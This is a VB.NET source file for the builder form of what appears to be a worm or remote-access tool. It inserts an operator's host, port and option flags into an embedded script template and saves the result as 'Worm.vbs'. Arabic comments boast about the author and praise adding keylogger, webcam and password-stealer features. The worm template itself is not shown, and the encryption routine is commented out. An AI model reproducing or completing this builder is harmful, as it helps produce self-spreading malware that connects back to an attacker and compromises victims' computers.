Public Class Build_crypt
    '########################################################################################################
    '################## تحياتى للى داخلين مجال البرمجة و هم كل اللى يعرفوه نقطة فى داحل بحر من مبرمج صغير داخل شركة برمجة صغيرة 
    '############################################# تحيتاى لكل من ياخذ نسخ و لصق دون ذكر اى حقوق لصاحب المشروع  و من ثم يقنعوا انفسهم بانهم يفهموا 
    '########################################## تحيتاى لكل شخص يفتحلى فورم و فقط يقعد يلعب فيها و هو ولا فاهم هو بيعمل ايه 
    '################################  احب اقول كلمة لكل هؤلااء الاشخص اللى لا يضيفوا شىء بل يكون عبء على مجال البرمجة, انه فى الاخر بعد تعديله البضين فى هذا المشروع 
    'انه لن يعرف يضيف  اليه خواص جديدة و من ثم فقط انا قد تعلمت كل هذا بنفسى ليس من مشاهدة بل بالقراءة و الفهم و الفهم الجيد 
    'ليس من الجيد ان تقنع نفسك بانك تفهم السورس و بعدها تعدل بالوان بضان زيك و تكتب اسمك عليه 
    'لانه لا يهمنى انا شخصيا لانه اذا همنى ذلك لما كنت لانشر ذلك السورس 
    '########################################################################################################
    '#### تحياتى الحقيقة للمطورين و اقصد المطورين هم من يضيفوا خواص جديدة مثل Webcam , Desktop , Keylogger 
    'او حتى password stealer
    '##############################تحياتى الحقيقة للاشخاص المبدعين اللى يستطيعوا نشر السورس مع ذكر حقوق المبرمج 
    '############### و احب اقول ان لو غيرت الاسم دون تطوير لن يضرنى فقط سيضرك انت لانه ستزال جاهل ههههههههه و لن تطور فى تعليمك للبرمجة
    '
    '
    '
    '
    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        'Generate
        Silent_Build()
    End Sub

    Private Sub Build_crypt_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Try
            TextBox2.Text = Form1.str


        Catch ex As Exception
            MsgBox("Error : Cannot Start Stub Creator " & vbNewLine & "Don`t Miss with the program" & vbNewLine & "Exception : " & ex.Message, MsgBoxStyle.Critical)

        End Try
       
    End Sub
    Private Sub Silent_Build()
        
        Dim a, b As String
        Dim C1, C2 As String
        If CheckBox1.Checked = True Then
            C1 = "true"
        Else
            C1 = "false"
        End If
        If CheckBox2.Checked = True Then
            C2 = "true"
        Else
            C2 = "false"
        End If
        a = My.Resources.Config2
        b = a.Replace("%HOST%", TextBox1.Text).Replace("%PORT%", TextBox2.Text).Replace("%LF%", C1).Replace("%LFO%", C2)
        SaveFileDialog1.Filter = "vb Script|.vbs"
        SaveFileDialog1.FileName = "Worm.vbs"
        If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then

            If SaveFileDialog1.FileName.Length > 0 Then

             
                Try
                    System.IO.File.WriteAllText(SaveFileDialog1.FileName, b)
                    MsgBox("Built Done Path : " & SaveFileDialog1.FileName, MsgBoxStyle.Information)
                Catch ex As Exception
                    MsgBox("Error : Cannot Build Worm " & vbNewLine & "Exception : " & ex.Message, MsgBoxStyle.Critical)
                End Try
            End If
        End If


    End Sub
    Private Sub Crypt()
        Silent_Build()
       

    End Sub
    Public Function Sp(ByVal s As String, ByVal r As String, ByVal p As Int32) As String
        
    End Function
    Private Function Encrypt(ByVal CodeKey As String, ByVal DataIn As String) As String
        'Dim num5 As Long = Strings.Len(DataIn)
        'Dim num3 As Long = 1
        'Do While (num3 <= num5)
        '    Dim num1 As Integer = Strings.Asc(Strings.Mid(DataIn, num3, 1))
        '    Dim num2 As Integer = Strings.Asc(Strings.Mid(CodeKey, ((num3 Mod Strings.Len(CodeKey)) + 1), 1))
        '    Dim str3 As String = Conversion.Hex((num1 Xor num2))
        '    If (Strings.Len(str3) = 1) Then
        '        str3 = "0" & str3
        '    End If
        '    Dim str2 As String = Nothing & str3
        '    num3 = (num3 + 1)

        'Loop
        'Return str2
    End Function
 
    Private Function GetRandom(ByVal Min As Int32, ByVal Max As Int32) As Int32
        Return New Random().Next(Min, Max)
    End Function
 
End Class